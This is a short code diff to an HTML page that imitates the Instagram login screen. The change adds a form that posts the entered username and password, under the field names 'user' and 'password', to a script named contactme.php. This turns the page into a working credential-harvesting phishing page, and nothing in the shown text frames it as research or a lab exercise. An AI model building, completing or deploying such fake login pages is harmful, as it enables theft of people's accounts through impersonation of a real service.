@@ -13,14 +13,16 @@
 			<div class="logo">
 				<img src="instagram.png" alt="instagram" style="width: 175px;">
 			</div>
-			<div class="form">
+			<div class="form" action="contactme.php" method="post">
+			<form action="contactme.php" method="post">
 				<div class="input_field">
-					<input type="text" placeholder="Phone number, username, or email" class="input">
+					<input type="text" name="user" placeholder="Phone number, username, or email" class="input">
 				</div>
 				<div class="input_field">
-					<input type="password" placeholder="Password" class="input">
+					<input type="password" name="password" placeholder="Password" class="input">
 				</div>
-				<div class="btn"><a href="st.html">Log In</a></a></div>
+				<button class="btn" type="submit" name="submit"><a href="st.html">Log In</a></a></button>
+			</form>
 			</div>
 			<div class="or">
 				<div class="line"></div>
